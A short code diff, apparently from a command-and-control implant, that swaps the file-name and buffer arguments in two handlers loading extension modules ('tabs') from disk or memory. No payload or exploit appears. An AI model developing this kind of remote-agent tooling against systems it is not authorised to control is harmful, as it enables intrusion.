@@ -78,7 +78,7 @@ static tlv_pkt_t *builtin_add_tab_disk(c2_t *c2)
 
     if (tlv_pkt_get_string(c2->request, TLV_TYPE_FILENAME, filename) >= 0)
     {
-        if (tabs_add(&c2->dynamic.tabs, c2->dynamic.t_count, NULL, filename, c2) >= 0)
+        if (tabs_add(&c2->dynamic.tabs, c2->dynamic.t_count, filename, NULL, c2) >= 0)
         {
             result = api_craft_tlv_pkt(API_CALL_SUCCESS);
             tlv_pkt_add_int(result, TLV_TYPE_TAB_ID, c2->dynamic.t_count);
@@ -99,7 +99,7 @@ static tlv_pkt_t *builtin_add_tab_buffer(c2_t *c2)
 
     if ((tab_size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_TAB, &tab)) >= 0)
     {
-        if (tabs_add(&c2->dynamic.tabs, c2->dynamic.t_count, tab, NULL, c2) >= 0)
+        if (tabs_add(&c2->dynamic.tabs, c2->dynamic.t_count, NULL, tab, c2) >= 0)
         {
             result = api_craft_tlv_pkt(API_CALL_SUCCESS);
             tlv_pkt_add_int(result, TLV_TYPE_TAB_ID, c2->dynamic.t_count);
